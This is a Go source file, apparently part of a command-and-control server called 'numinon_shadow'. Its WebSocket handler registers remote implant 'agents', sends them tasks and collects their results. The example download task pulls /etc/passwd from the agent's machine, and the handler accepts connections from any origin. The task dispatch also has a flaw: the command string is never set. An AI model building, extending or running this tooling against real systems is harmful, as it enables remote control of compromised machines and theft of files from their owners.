package router

import (
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func WSHandler(w http.ResponseWriter, r *http.Request) {
	// (1) UPGRADE from HTTP/1.1 to WebSocket connection
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("WebSocket upgrade failed:", err)
		return
	}
	defer conn.Close()

	// (2) Extract Agent ID
	agentID := r.Header.Get("Agent-ID")
	if agentID == "" {
		log.Println("Agent connected without an ID")
		return
	}

	// (3) DETERMINE PROTOCOL
	var agentProtocol config.AgentProtocol

	if r.TLS == nil {
		agentProtocol = config.WebsocketClear
	} else {
		agentProtocol = config.WebsocketSecure
	}

	log.Printf("AGENT CONNECTED | ID: %s | Protocol: %s |\n", agentID, agentProtocol)

	var command string
	go createAndSendTask(conn, agentID, command)

	// (5) READING LOOP - Reading messages FROM the agent (e.g., task results)
	for {
		// ReadMessage is a blocking call. It will wait here for the agent to send a message.
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			log.Printf("AGENT DISCONNECTED: %s. Reason: %v", agentID, err)
			break // Exit the loop if the connection is closed or an error occurs.
		}

		log.Printf("Received message of type %d from Agent %s: %s", messageType, agentID, string(p))

		// Process the received message from the agent.
		if messageType == websocket.TextMessage || messageType == websocket.BinaryMessage {
			procErr := wsProcessIncomingMessage(conn, agentID, agentProtocol, p)
			if procErr != nil {
				log.Printf("|❗ERR WS HANDLER| AgentID: %s - Error processing incoming message: %v. Continuing read loop.", agentID, procErr)
			}
		}
	}
}

// In the task issuing goroutine, replace the task creation with:
func createAndSendTask(conn *websocket.Conn, agentID string, command string) error {
	// Create command arguments based on command type
	var commandArgs json.RawMessage
	switch command {
	case "download":
		args := models.DownloadArgs{
			SourceFilePath: "/etc/passwd", // Example
		}
		commandArgs, _ = json.Marshal(args)
	default:
		commandArgs = json.RawMessage("{}")
	}

	// Create task in task manager
	task, err := TaskManager.CreateTask(agentID, command, commandArgs)
	if err != nil {
		return fmt.Errorf("failed to create task: %w", err)
	}

	// Use orchestrator to prepare the task
	if err := Orchestrators.PrepareTask(task); err != nil {
		return fmt.Errorf("failed to prepare task: %w", err)
	}

	// Update task with orchestrator metadata
	TaskManager.UpdateTask(task)

	// Build response
	response := models.ServerTaskResponse{
		TaskAvailable: true,
		TaskID:        task.ID,
		Command:       task.Command,
		Data:          task.Arguments,
	}

	// Send to agent
	jsonResponse, err := json.Marshal(response)
	if err != nil {
		return err
	}

	if err := conn.WriteMessage(websocket.TextMessage, jsonResponse); err != nil {
		return err
	}

	// Mark as dispatched after successful send
	TaskManager.MarkDispatched(task.ID)

	log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s (WebSocket)",
		command, task.ID, agentID)

	return nil
}

// Update wsProcessIncomingMessage to use task manager and orchestration:
func wsProcessIncomingMessage(conn *websocket.Conn, agentID string, agentProtocol config.AgentProtocol, p []byte) error {
	log.Printf("|_DBG WS HANDLER| AgentID: %s - Processing message (%d bytes)", agentID, len(p))

	// Unmarshal the result
	var result models.AgentTaskResult
	if err := json.Unmarshal(p, &result); err != nil {
		log.Printf("|❗ERR RESULT| Error unmarshaling result JSON from agent %s: %v", agentID, err)
		return fmt.Errorf("error unmarshaling result JSON from agent %s: %v", agentID, err)
	}

	// Look up the task
	task, err := TaskManager.GetTask(result.TaskID)
	if err != nil {
		log.Printf("|❗ERR RESULT| Task not found: %s from agent %s", result.TaskID, agentID)
		return fmt.Errorf("task not found: %s", result.TaskID)
	}

	// Verify agent ID matches
	if task.AgentID != agentID {
		log.Printf("|⚠️ SECURITY| Task %s result received from wrong agent. Expected: %s, Got: %s",
			result.TaskID, task.AgentID, agentID)
		return fmt.Errorf("unauthorized: wrong agent for task")
	}

	// Store the result
	if err := TaskManager.StoreResult(task.ID, p); err != nil {
		log.Printf("|❗ERR RESULT| Failed to store result for task %s: %v", task.ID, err)
		return fmt.Errorf("failed to store result: %w", err)
	}

	// Use orchestrator to process command-specific logic
	if err := Orchestrators.ProcessResult(task, p); err != nil {
		log.Printf("|❗ERR PROCESS| Command-specific processing failed for task %s: %v",
			task.ID, err)
		TaskManager.MarkFailed(task.ID, err.Error())
	} else {
		// Update task with any metadata changes from processing
		TaskManager.UpdateTask(task)
	}

	// Pretty print for debugging
	prettyPrintResult(result, agentID)

	return nil
}
